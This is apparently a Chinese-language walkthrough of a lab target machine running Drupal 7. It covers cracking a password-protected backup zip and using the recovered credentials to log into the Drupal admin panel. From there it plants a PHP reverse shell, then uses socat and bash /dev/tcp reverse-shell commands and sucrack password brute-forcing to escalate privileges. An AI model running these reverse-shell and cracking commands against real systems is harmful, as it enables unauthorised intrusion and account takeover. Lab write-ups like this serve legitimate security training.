> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/6SNpF-fxEIncD1Hk70Zvcw)

使用 netdiscover 针对局域网中主机进行扫描存活

![](https://mmbiz.qpic.cn/mmbiz_png/vxZrt4kAItmqdtictkFgmc5d8W5JJPt4ltZo1O6DxNt58M6x3EEfZwLg9diaFpgWqTV7qKUBsqEmqwOZGrJoAaKQ/640?wx_fmt=png)

这里 Kali 攻击机器是 192.168.0.106

目标靶机位 192.168.0.105

常规的信息收集

端口

存在默认 http 端口 使用 apache 2.4.25 使用 debian 系统

此中间件版本存在解析漏洞，之后可以用在文件上传上面

![](https://mmbiz.qpic.cn/mmbiz_png/vxZrt4kAItmqdtictkFgmc5d8W5JJPt4lm0Z7OQoMibUlYfOZepq844b1pKdBatic2qTQ5UbY7cWagiaUcRnc2otfg/640?wx_fmt=png)

目录

Backup 中获得加密的 zip 文件

Drupal CMS 存在许多漏洞

![](https://mmbiz.qpic.cn/mmbiz_png/vxZrt4kAItmqdtictkFgmc5d8W5JJPt4l0DuWALphgvX4PhgRK6eyV5TI53qPBnjY8vIHdRISJrC2DvBtEK01IQ/640?wx_fmt=png)

CMS 漏洞扫描

https://www.ddosi.com/cms-scan/  推荐的扫描器集合

目前已经确认网站使用 durpal 框架

![](https://mmbiz.qpic.cn/mmbiz_png/vxZrt4kAItmqdtictkFgmc5d8W5JJPt4lEPgO2t0EEPy1icOomdPTicKPJ6HO1glH47BOHialudZt6c33ST4ibCbPrg/640?wx_fmt=png)

获取更多的暴露面

![](https://mmbiz.qpic.cn/mmbiz_png/vxZrt4kAItmqdtictkFgmc5d8W5JJPt4libMI1zViaNeYdial6feHPz4Mx5odFHibwrDJJtzS6E4Hl9YAwmGcxUvLCQ/640?wx_fmt=png)

目前已经拿到 backup 加密压缩文件以及登录页面

Durpal 7 版本

![](https://mmbiz.qpic.cn/mmbiz_png/vxZrt4kAItmqdtictkFgmc5d8W5JJPt4libJDR2micwkck3BLjcicH6dGlSX3YibgicLEDBOBlXeDj8D3QDRa18iaQWIA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/vxZrt4kAItmqdtictkFgmc5d8W5JJPt4lCMjlSc3oamex8iao94SdKefwT7Ml0bZspdnaos4dboGtSPfyhfhz9QQ/640?wx_fmt=png)

先查看文件是 zip 文件但是存在密码

![](https://mmbiz.qpic.cn/mmbiz_png/vxZrt4kAItmqdtictkFgmc5d8W5JJPt4lvOhoFfnS73sWUKGQXOUoLYpuJ9R22PprNb7PiaPWjptQbt8RjJiaaXRQ/640?wx_fmt=png)

使用 zip2john 获取 hash 值

在使用 john 进行爆破 hash

卒

![](https://mmbiz.qpic.cn/mmbiz_png/vxZrt4kAItmqdtictkFgmc5d8W5JJPt4leNN5D9aQ9VqKkVgKJ7jqhI9kDFjH6ibPzQXhOziaMDMuKe2LWgIjDs4A/640?wx_fmt=png)

换 fcrackzip

密码为 thebackup

![](https://mmbiz.qpic.cn/mmbiz_png/vxZrt4kAItmqdtictkFgmc5d8W5JJPt4l5DDepPoIEEMVGhQsGzjxQHDKSZG6Z3Ht0PYw1hnaTibeJZMtFibL0IDg/640?wx_fmt=png)

Unzip 解压查看压缩包内容

使用 cat 命令查看 dump.sql 也就是压缩包的文件内容

![](https://mmbiz.qpic.cn/mmbiz_png/vxZrt4kAItmqdtictkFgmc5d8W5JJPt4ln7icPDaexpBls6BvtnFFTpqMXz7PqiakuypAgjXGpyHjPlIGMibfzKExw/640?wx_fmt=png)

上 somd5 查看

root:drupal

webman:moranguita

将获得账户密码登录 drupal 管理页面

使用 webman 用户登录成功

![](https://mmbiz.qpic.cn/mmbiz_png/vxZrt4kAItmqdtictkFgmc5d8W5JJPt4lIDLKp4EW4x55kL7wJmecGCe2FPwIL1boNfgtqJKkRiaVnnYY70B5o1g/640?wx_fmt=png)

进入后台之后要获取 shell

1、知道框架为 drupal 7 可以使用已知的漏洞来打下

2、寻找上传点

3、查看是否存在系统工具存在 RCE

4、发布网页直接使用 php 反弹 shell

5、也可以文件包含我们写好的小马网页

此处我们可以直接发布一个网页，插入 php 反弹 shell, 当我们发布的时候使用 nc 进行本地监听端口即可。

![](https://mmbiz.qpic.cn/mmbiz_png/vxZrt4kAItmqdtictkFgmc5d8W5JJPt4lX5xMdTs8qDVWxLdu9lBfibTvjpqZ80A896vQx8ZJEVFekMM1FUA9rJA/640?wx_fmt=png)

从上图可以看到，我们没有安装 php 的插件，是不会进行解析的，我们需要到插件中安装

![](https://mmbiz.qpic.cn/mmbiz_png/vxZrt4kAItmqdtictkFgmc5d8W5JJPt4l0LAibTbaiaXbLnlNW0grRZdzVuEURGlHuZz9u9wl2TVIKMusEdib7ru8g/640?wx_fmt=png)

最后要保存配置

![](https://mmbiz.qpic.cn/mmbiz_png/vxZrt4kAItmqdtictkFgmc5d8W5JJPt4l8V1pG5WEOJyPHO332XhjFyZeBicEP0HRZmSPZDiaEmUeUfDlABfwZS5g/640?wx_fmt=png)

修改反弹 ip 以及监听端口

![](https://mmbiz.qpic.cn/mmbiz_png/vxZrt4kAItmqdtictkFgmc5d8W5JJPt4lTkQ3f8E6MSycmK0sOEs5mYSpPQTrTEoHV0uQcdlgqKm3ntibc2FAdZg/640?wx_fmt=png)

使用 nc 在本地进行监听

 Nc –nvlp 5050

监听后发布文章

![](https://mmbiz.qpic.cn/mmbiz_png/vxZrt4kAItmqdtictkFgmc5d8W5JJPt4llvetib8YMTghlVrhAtMMpOMxJavfia00DWFhkbCIlVjUazw8M6fUy0uQ/640?wx_fmt=png)

获取 www-data 权限

![](https://mmbiz.qpic.cn/mmbiz_png/vxZrt4kAItmqdtictkFgmc5d8W5JJPt4lF1tGb9sl4Sr5VtqEeViajg3M8TibtDZoGb8ntGd9C5gq8iarMtMuGgIHA/640?wx_fmt=png)

进行本地提权

本地提权的前提也是需要信息收集

![](https://mmbiz.qpic.cn/mmbiz_png/vxZrt4kAItmqdtictkFgmc5d8W5JJPt4lQkAX5EBJIqmLNx9Geb06D4z53LzichOc060gwkEibQCfguLMxu9V0G5g/640?wx_fmt=png)

他没有安装 python2

我们使用 socat 工具反弹一个 shell

Socat 安装链接

https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat

![](https://mmbiz.qpic.cn/mmbiz_png/vxZrt4kAItmqdtictkFgmc5d8W5JJPt4lJwQqFQj5bYcwaiaVBJXc9QdoXLwicTdHJvOfO937IDhtf5XxnCjdhyKg/640?wx_fmt=png)

上图，在 kali 中使用 python 开启 simplehttpsever 服务

靶机使用 wget 命令获取 socat 工具

在 Kali 中设置 socat 监听

```
socat file:`tty`,raw,echo=0 tcp-listen:5051
```

靶机中执行  

```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.0.106:5051
```

```
Nc –nvlp 5051
```

![](https://mmbiz.qpic.cn/mmbiz_png/vxZrt4kAItmqdtictkFgmc5d8W5JJPt4lYQ9TNSuysGsdHnCcn5oiaSM3RKk6sZRPCKJAnDQibS3lyZZ5JWXibibiaDA/640?wx_fmt=png)

以上相同可以使用 nc 作为监听

```
bash -c 'bash >&/dev/tcp/192.168.0.106/5051 0>&1'
```

靶机中也可以使用 bash 反弹

```
bash -c 'bash >&/dev/tcp/192.168.0.106/5051 0>&1'
```

获取一个新的 tty 之后

本地提权的信息收集：

在 home/user 下找到提示

Rockyou 的前 300 条是 root 用户的密码

![](https://mmbiz.qpic.cn/mmbiz_png/vxZrt4kAItmqdtictkFgmc5d8W5JJPt4lzHiaVJuGMQPKCTlkveic7rXOhzkFIpy5ibI5XmhTcaZ3sUMRz7LFrpLew/640?wx_fmt=png)

在 kali 中使用 head 命令

![](https://mmbiz.qpic.cn/mmbiz_png/vxZrt4kAItmqdtictkFgmc5d8W5JJPt4l0aDpJOwcl215e6dfMybykkE7cJI6KVcoE1TQMMvCFPt5Qnj5hmZl0w/640?wx_fmt=png)

上图完成前 300 条的字典

使用 sucrack 工具进行本地密码的爆破

找到 kali 系统 sucrack 工具存放的位置：

![](https://mmbiz.qpic.cn/mmbiz_png/vxZrt4kAItmqdtictkFgmc5d8W5JJPt4l18UXqzFzQr6WvTJv4wo9L1dQIlrh5OzhEwCbLosuT6icNEGzTjqtsdg/640?wx_fmt=png)

将 sucrack 工具和 1.txt 字典一共传到靶机 /tmp 文件夹下

![](https://mmbiz.qpic.cn/mmbiz_png/vxZrt4kAItmqdtictkFgmc5d8W5JJPt4lYLE9EOkFElY9NXzFXdpDPIicEvppGQfZNZQErFNh2oEAibtNpdhycazw/640?wx_fmt=png)

使用 sucrack 工具进行爆破

![](https://mmbiz.qpic.cn/mmbiz_png/vxZrt4kAItmqdtictkFgmc5d8W5JJPt4l9nNpHBCeyoqibFtyc1dwickQBgz9fSBN0uFdbHxrPsPaicm6Gc7n0EtPw/640?wx_fmt=png)  

![](https://mmbiz.qpic.cn/mmbiz_jpg/vxZrt4kAItnZe81OLsXwqBQ5Xic67mHDUV7COGpn5ibCUbjVDSkRABAref90Oax1MZyic05uz7LdhCG2oib26A5LeQ/640?wx_fmt=jpeg)